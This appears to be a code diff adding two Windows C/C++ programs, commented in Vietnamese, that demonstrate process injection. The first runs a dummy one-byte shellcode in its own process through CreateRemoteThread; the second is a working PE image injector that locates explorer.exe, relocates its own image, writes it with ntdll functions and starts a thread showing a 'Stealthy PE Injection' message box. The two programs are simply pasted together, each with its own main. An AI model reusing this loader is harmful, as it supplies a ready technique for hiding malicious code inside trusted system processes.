@@ -1,0 +1,220 @@
+#include <windows.h>
+#include <stdio.h>
+
+typedef struct _ThreadArgs {
+    unsigned char* code;
+    size_t size;
+} ThreadArgs;
+
+// Shellcode đơn giản (MessageBox), nên x86/x64 cần tương thích đúng (đây là dummy)
+unsigned char shellcode[] = {
+    0xC3 // ret — đơn giản chỉ để demo
+};
+
+int main() {
+    // Tìm tiến trình đích — ở đây là chính mình để dễ test
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
+    if (!hProcess) {
+        printf("Failed to open process\n");
+        return -1;
+    }
+
+    size_t codeSize = sizeof(shellcode);
+
+    // Ghi shellcode vào remote
+    LPVOID remoteCode = VirtualAllocEx(hProcess, NULL, codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteCode) {
+        printf("Failed to allocate memory for shellcode\n");
+        return -1;
+    }
+
+    if (!WriteProcessMemory(hProcess, remoteCode, shellcode, codeSize, NULL)) {
+        printf("Failed to write shellcode\n");
+        return -1;
+    }
+
+    // Tạo struct ThreadArgs
+    ThreadArgs localArgs;
+    localArgs.code = (unsigned char*)remoteCode;  // địa chỉ trong remote process
+    localArgs.size = codeSize;
+
+    // Ghi struct vào remote
+    LPVOID remoteArgs = VirtualAllocEx(hProcess, NULL, sizeof(ThreadArgs), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remoteArgs) {
+        printf("Failed to allocate memory for args\n");
+        return -1;
+    }
+
+    if (!WriteProcessMemory(hProcess, remoteArgs, &localArgs, sizeof(ThreadArgs), NULL)) {
+        printf("Failed to write args\n");
+        return -1;
+    }
+
+    // Viết hàm thread xử lý code và size — ở đây giả định bạn đã compile thành DLL hoặc shellcode
+    // Ở đây tôi sẽ giả định bạn đã có sẵn shellcode tại địa chỉ remoteCode
+    // Nhưng để xử lý args, bạn cần viết 1 thread function thực sự
+
+    // Thread entry giả định là 1 hàm đã được inject, ví dụ đã ở trong .dll được load sẵn
+    // Để đơn giản, chúng ta sẽ dùng shellcode ret (0xC3)
+    // Nếu bạn có một đoạn mã cụ thể xử lý `code` và `size`, bạn cần inject nó và trỏ vào đúng địa chỉ
+
+    HANDLE hThread = CreateRemoteThread(
+        hProcess,
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)remoteCode,  // Shellcode chỉ là ret
+        remoteArgs,                          // Truyền địa chỉ struct
+        0,
+        NULL
+    );
+
+    if (!hThread) {
+        printf("CreateRemoteThread failed: %lu\n", GetLastError());
+        return -1;
+    }
+
+    printf("Thread created. Waiting...\n");
+    WaitForSingleObject(hThread, INFINITE);
+
+    printf("Done.\n");
+
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    return 0;
+}
+
+#include <Windows.h>
+#include <winternl.h>
+#include <TlHelp32.h>
+#include <iostream>
+
+#pragma comment(lib, "ntdll.lib")
+
+typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress,
+    PVOID Buffer,
+    ULONG NumberOfBytesToWrite,
+    PULONG NumberOfBytesWritten
+    );
+
+typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect
+    );
+
+typedef NTSTATUS(NTAPI* _NtCreateThreadEx)(
+    OUT PHANDLE hThread,
+    IN ACCESS_MASK DesiredAccess,
+    IN PVOID ObjectAttributes,
+    IN HANDLE ProcessHandle,
+    IN PVOID lpStartAddress,
+    IN PVOID lpParameter,
+    IN ULONG Flags,
+    IN SIZE_T StackZeroBits,
+    IN SIZE_T SizeOfStackCommit,
+    IN SIZE_T SizeOfStackReserve,
+    OUT PVOID lpBytesBuffer
+    );
+
+HANDLE GetTargetProcess(const wchar_t* name) {
+    PROCESSENTRY32W entry;
+    entry.dwSize = sizeof(entry);
+
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (Process32FirstW(snapshot, &entry)) {
+        do {
+            if (_wcsicmp(entry.szExeFile, name) == 0) {
+                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
+                CloseHandle(snapshot);
+                return hProcess;
+            }
+        } while (Process32NextW(snapshot, &entry));
+    }
+    CloseHandle(snapshot);
+    return NULL;
+}
+
+DWORD WINAPI Payload() {
+    MessageBoxA(NULL, "Stealthy PE Injection", "Success", MB_OK);
+    return 0;
+}
+
+int main() {
+    const wchar_t* targetProc = L"explorer.exe";
+    HANDLE hProc = GetTargetProcess(targetProc);
+    if (!hProc) {
+        std::wcerr << L"Failed to find target process." << std::endl;
+        return 1;
+    }
+
+    // Get current PE image
+    PVOID imageBase = GetModuleHandle(NULL);
+    auto dos = (PIMAGE_DOS_HEADER)imageBase;
+    auto nt = (PIMAGE_NT_HEADERS)((BYTE*)imageBase + dos->e_lfanew);
+
+    SIZE_T size = nt->OptionalHeader.SizeOfImage;
+    PVOID localCopy = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    memcpy(localCopy, imageBase, size);
+
+    // Calculate base delta
+    PVOID remoteBase = nullptr;
+    SIZE_T regionSize = size;
+
+    _NtAllocateVirtualMemory NtAlloc = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
+    _NtWriteVirtualMemory NtWrite = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
+    _NtCreateThreadEx NtThread = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
+
+    NTSTATUS status = NtAlloc(hProc, &remoteBase, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!NT_SUCCESS(status)) {
+        std::cerr << "NtAllocateVirtualMemory failed.\n";
+        return 1;
+    }
+
+    // Relocate image
+    DWORD_PTR delta = (DWORD_PTR)remoteBase - (DWORD_PTR)imageBase;
+    auto relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    if (relocDir.VirtualAddress) {
+        auto reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)localCopy + relocDir.VirtualAddress);
+        while (reloc->SizeOfBlock) {
+            int count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+            WORD* list = (WORD*)(reloc + 1);
+            for (int i = 0; i < count; i++) {
+                if (list[i]) {
+                    DWORD offset = list[i] & 0x0FFF;
+                    DWORD type = list[i] >> 12;
+                    if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64) {
+                        DWORD_PTR* patch = (DWORD_PTR*)((BYTE*)localCopy + reloc->VirtualAddress + offset);
+                        *patch += delta;
+                    }
+                }
+            }
+            reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
+        }
+    }
+
+    // Write to remote
+    status = NtWrite(hProc, remoteBase, localCopy, (ULONG)size, NULL);
+    if (!NT_SUCCESS(status)) {
+        std::cerr << "NtWriteVirtualMemory failed.\n";
+        return 1;
+    }
+
+    // Start remote thread using relocated address of Payload()
+    PVOID remoteEntry = (PVOID)((DWORD_PTR)Payload + delta);
+    HANDLE hThread = NULL;
+    status = NtThread(&hThread, THREAD_ALL_ACCESS, NULL, hProc, remoteEntry, NULL, FALSE, 0, 0, 0, NULL);
+
+    if (!NT_SUCCESS(status)) {
+        std::cerr << "NtCreateThreadEx failed.\n";
+        return 1;
+    }
+
+    std::cout << "[+] Remote thread created.\n";
+    return 0;
+}
+
